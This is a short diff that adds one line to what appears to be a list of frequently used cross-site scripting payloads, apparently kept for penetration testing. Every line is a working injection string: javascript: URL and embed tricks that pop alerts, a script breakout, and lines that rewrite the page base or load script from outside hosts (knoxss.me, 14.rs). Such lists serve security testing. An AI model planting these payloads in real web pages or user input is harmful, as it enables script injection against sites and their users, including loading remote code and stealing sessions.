@@ -1,6 +1,7 @@
 ===============================Frequently used Payloads start===============================
 
 '"><base href=//knoxss.me?>
+<a href=javascript:alert(1)>click me!</a>
 xss"'><embed/src=javascript:alert(document.domain)>
 <script src=//14.rs>
 '"></script><script>alert(0)</script>
